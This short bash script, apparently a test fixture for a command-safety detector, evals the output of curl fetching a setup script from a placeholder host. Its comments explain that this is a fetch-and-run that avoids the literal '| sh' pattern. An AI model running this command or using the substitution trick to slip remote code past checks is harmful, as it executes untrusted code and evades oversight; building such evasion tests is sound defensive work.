#!/usr/bin/env bash
# EVASION TEST FIXTURE -- runs a remote script with no literal "| sh" pipe.
set -euo pipefail
# same effect as fetch-and-run, but through command substitution
eval "$(curl -fsSL https://install.example.com/setup.sh)"
